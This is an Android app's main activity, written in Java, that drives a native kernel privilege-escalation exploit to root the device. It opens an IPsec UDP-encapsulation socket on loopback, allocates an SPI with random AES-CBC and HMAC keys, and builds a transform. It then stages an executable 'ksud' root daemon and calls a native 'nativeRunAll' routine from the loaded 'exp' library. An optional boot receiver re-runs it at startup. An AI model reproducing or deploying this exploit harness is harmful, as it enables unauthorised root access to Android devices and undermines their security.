package df.root;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;

import androidx.appcompat.app.AppCompatActivity;

import df.root.databinding.ActivityMainBinding;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity implements IReporter {

    private static final String TAG = "dfroot";

    static { System.loadLibrary("exp"); }

    private ActivityMainBinding binding;
    private final Handler mMain = new Handler(Looper.getMainLooper());
    private final Executor mExec = Executors.newSingleThreadExecutor();

    public void report(String msg) {
        mMain.post(() -> {
            binding.outputView.append(msg);
            binding.outputScroll.post(() -> binding.outputScroll.fullScroll(View.FOCUS_DOWN));
        });
    }

    static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                    byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                    int senderPort, String ksudPath, boolean skipSoftReboot);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        setSupportActionBar(binding.toolbar);

        refreshRunState();

        binding.btnRun.setOnClickListener(v -> {
            binding.btnRun.setEnabled(false);
            binding.outputView.setText("");
            mExec.execute(() -> runExploit());
        });

        ComponentName bootReceiver = new ComponentName(this, BootReceiver.class);
        int state = getPackageManager().getComponentEnabledSetting(bootReceiver);
        binding.switchBootStart.setChecked(state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
        binding.switchBootStart.setOnCheckedChangeListener((btn, checked) ->
            getPackageManager().setComponentEnabledSetting(bootReceiver,
                checked ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                        : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP));
    }

    /**
     * 只有在确实安全时才允许运行：
     *  - 本轮已经开过钩（/dev/df）；
     *  - 检测到别的 root 方案已经在生效（/system/bin/su 等仍然存在）。
     * 后者会让 ksud 跳过加载模块、停留在 vendor_modprobe 域，最终安装失败并把
     * su 截成 0 字节 —— 实测过，所以直接拦住。
     */
    private void refreshRunState() {
        String reason = DeviceCheck.blockReason();
        if (reason == null) {
            binding.statusText.setText(R.string.status_ready);
            binding.statusText.setTextColor(Color.parseColor("#1B8A2E"));
            binding.btnRun.setEnabled(true);
            binding.btnRun.setText(R.string.btn_run);
        } else {
            binding.statusText.setText(reason);
            binding.statusText.setTextColor(Color.parseColor("#C62828"));
            binding.btnRun.setEnabled(false);
            binding.btnRun.setText(R.string.btn_run_blocked);
        }
    }

    private void runExploit() {
        try {
            String reason = DeviceCheck.blockReason();
            if (reason != null) {
                log("已中止：" + reason);
                return;
            }
            log(DeviceCheck.report());
            if (!DeviceCheck.preflight("手动运行")) {
                log("\n自检未通过：依赖路径缺失 —— 没有修改任何文件，已中止。");
                return;
            }

            IpSecManager ipsec = (IpSecManager) getSystemService(IPSEC_SERVICE);

            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();
            log("IPSec 封装端口: " + encapPort);

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            IpSecManager.SecurityParameterIndex spiObj =
                    ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();
            log("SPI: 0x" + Integer.toHexString(spiVal));

            SecureRandom rng = new SecureRandom();
            byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
            byte[] hmacKey = new byte[32]; rng.nextBytes(hmacKey);

            IpSecAlgorithm enc  = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);

            DatagramSocket senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();
            senderSock.close();

            IpSecTransform transform = new IpSecTransform.Builder(this)
                    .setEncryption(enc)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            stageAsset(this, "ksud", true, getFilesDir());
            log("ksud 已暂存到: " + new File(getFilesDir(), "ksud").getAbsolutePath());
            log("开始执行漏洞利用……");

            int icvLen = 128 / 8;
            String ksudPath = new File(getFilesDir(), "ksud").getAbsolutePath();
            int rc = nativeRunAll(this, encapPort, spiVal, aesKey, hmacKey, icvLen, senderPort, ksudPath, true);

            transform.close();
            spiObj.close();
            encapSock.close();

        } catch (Exception e) {
            Log.e(TAG, "exploit exception", e);
            log("\n发生异常: " + e);
        } finally {
            mMain.post(() -> {
                binding.btnRun.setText(R.string.btn_run);
                refreshRunState();
            });
        }
    }

    static void stageAsset(Context ctx, String name, boolean executable, File dir) throws IOException {
        File dest = new File(dir, name);
        File tmp = new File(dest.getPath() + ".tmp");
        try (InputStream in = ctx.getAssets().open(name);
             OutputStream out = new FileOutputStream(tmp)) {
            byte[] buf = new byte[8192];
            for (int n; (n = in.read(buf)) > 0; ) out.write(buf, 0, n);
        }
        if (!tmp.renameTo(dest)) { tmp.delete(); throw new IOException("rename failed: " + dest); }
        if (executable) dest.setExecutable(true, false);
    }

    private void log(String msg) {
        Log.i(TAG, msg);
        report(msg + "\n");
    }
}
